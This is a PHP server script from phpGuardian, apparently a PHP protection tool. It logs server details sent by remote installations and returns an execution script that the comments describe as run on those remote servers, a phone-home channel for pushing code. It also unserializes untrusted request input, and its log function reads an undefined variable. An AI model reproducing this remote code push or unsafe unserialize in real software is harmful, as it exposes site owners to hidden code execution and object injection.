<?php
/**
 *        _            ____                     _ _             ____
 *  _ __ | |__  _ __  / ___|_   _  __ _ _ __ __| (_) __ _ _ __ |___ \
 * | '_ \| '_ \| '_ \| |  _| | | |/ _` | '__/ _` | |/ _` | '_ \  __) |
 * | |_) | | | | |_) | |_| | |_| | (_| | | | (_| | | (_| | | | |/ __/
 * | .__/|_| |_| .__/ \____|\__,_|\__,_|_|  \__,_|_|\__,_|_| |_|_____|
 * |_|         |_| phpGuardian CLI
 *
 *
 * PHPGUARDIAN2
 *
 * CODE NAME:      phoenix
 * ENGINE VERSION: 4.0
 * MODULE VERSION: 1.0
 *
 * URL:            http://www.phpguardian.org
 * E-MAIL:         info@phpguardian.org
 *
 * COPYRIGHT:      2006-2011 Fabio Cicerchia
 * LICENSE:        GNU GPL 3+
 *                 This program is free software: you can redistribute it and/or
 *                 modify it under the terms of the GNU General Public License
 *                 as published by the Free Software Foundation, either version
 *                 3 of the License, or (at your option) any later version.
 *
 *                 This program is distributed in the hope that it will be
 *                 useful, but WITHOUT ANY WARRANTY; without even the implied
 *                 warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR
 *                 PURPOSE. See the GNU General Public License for more details.
 *
 *                 You should have received a copy of the GNU General Public
 *                 Licensealong with this program. If not, see
 *                 <http://www.gnu.org/licenses/>.
 *
 * $Id: $
 **/

/**
 * @category  Security
 * @package   phpGuardian
 * @version   4.0
 * @author    Fabio Cicerchia <info@fabiocicerchia.it>
 * @copyright 2006-2011 Fabio Cicerchia
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt GNU General Public License 3.0
 * @link      http://www.phpguardian.org
 */
class PG_Server {

    // {{{ PROPERTIES
    /**
     * The content data
     * @access private
     * @type string
     */
    private $_data;

    /**
     * String format for log
     * @access public
     * @type string
     *
	 * %i  REMOTE_ADDR
	 * %h  gethostbyaddr(REMOTE_ADDR)
	 * %d  HTTP_HOST
	 * %t  strftime(date_format)
	 * %s  SCRIPT_FILENAME
	 * %r  HTTP_REFERER
	 * %ua HTTP_USER_AGENT
	 * %se SERVER_SIGNATURE
	 * %so SERVER_SOFTWARE
	 * %a  SERVER_ADDR
	 * %p  SERVER_PORT
	 * %dr DOCUMENT_ROOT
	 * %e  SERVER_ADMIN
     */
    public $log_format = "[%t] %i %h %d:%s";

    /**
     * Log file
     * @access public
     * @type string
     */
    public $log_file = "/home/fabio/www/phpg.log";

    /**
     * Date format into log_format
     * @access public
     * @type string
     * see php docs for strftime syntax (http://www.php.net/strftime)
     */
    public $date_format = "%a %d %b %Y %H:%M:%S";

    /**
     * Script for execution on remote servers
     * @access public
     * @type string
     */
    public $exec_file = "/home/fabio/www/phpg.exec";

    /**
     * Content of execution script
     * @access private
     * @type sting
     */
    private $_exec_file_content;
    // }}}

    // {{{ METHODS
    // {{{ function __construct
    /**
     * Constructor (PHP5)
     * @access public
     * @param  string $data
     */
    public function __construct($data = '') {
        $this->_data = $data;

        if (file_exists($this->exec_file)) $this->_exec_file_content = file_get_contents($this->exec_file);
    }
    // }}}

    // {{{ function log_data
    /**
     * Process the request, save a line of log and if available send the execution script
     * @access public
     * @return string
     */
    public function log_data() {
        $param = base64_decode($param);

        $param_arr = @unserialize($param);

        $placeholder['%i']  = !empty($param_arr['REMOTE_ADDR'])      ? $param_arr['REMOTE_ADDR']                 : 'N/A';
        $placeholder['%h']  = !empty($param_arr['REMOTE_ADDR'])      ? @gethostbyaddr($param_arr['REMOTE_ADDR']) : 'N/A';
        $placeholder['%d']  = !empty($param_arr['HTTP_HOST'])        ? $param_arr['HTTP_HOST']                   : 'N/A';
        $placeholder['%t']  = @strftime($this->date_format);
        $placeholder['%s']  = !empty($param_arr['SCRIPT_FILENAME'])  ? $param_arr['SCRIPT_FILENAME']             : 'N/A';
        $placeholder['%r']  = !empty($param_arr['HTTP_REFERER'])     ? $param_arr['HTTP_REFERER']                : 'N/A';
        $placeholder['%ua'] = !empty($param_arr['HTTP_USER_AGENT'])  ? $param_arr['HTTP_USER_AGENT']             : 'N/A';
        $placeholder['%se'] = !empty($param_arr['SERVER_SIGNATURE']) ? $param_arr['SERVER_SIGNATURE']            : 'N/A';
        $placeholder['%so'] = !empty($param_arr['SERVER_SOFTWARE'])  ? $param_arr['SERVER_SOFTWARE']             : 'N/A';
        $placeholder['%a']  = !empty($param_arr['SERVER_ADDR'])      ? $param_arr['SERVER_ADDR']                 : 'N/A';
        $placeholder['%p']  = !empty($param_arr['SERVER_PORT'])      ? $param_arr['SERVER_PORT']                 : 'N/A';
        $placeholder['%dr'] = !empty($param_arr['DOCUMENT_ROOT'])    ? $param_arr['DOCUMENT_ROOT']               : 'N/A';
        $placeholder['%e']  = !empty($param_arr['SERVER_ADMIN'])     ? $param_arr['SERVER_ADMIN']                : 'N/A';

        $string = $this->log_format;
        foreach($placeholder as $key => $value) $string = str_replace($key, $value, $string);

        $fp = fopen($this->log_file, 'a');
        fwrite($fp, "$string\n");
        fclose($fp);

        return $this->_exec_file_content;
    }
    // }}}
    // }}}
}

/**
 * Process the request
 */
if (isset($_GET['pc'])) {
    $pg_server = new PG_Server(strip_tags($_GET['pc']));

    if (isset($_GET['op'])) {
        switch(strip_tags($_GET['op'])) {
            case "log":
                echo $pg_server->log_data();
                break;
        }
    }
}
exit;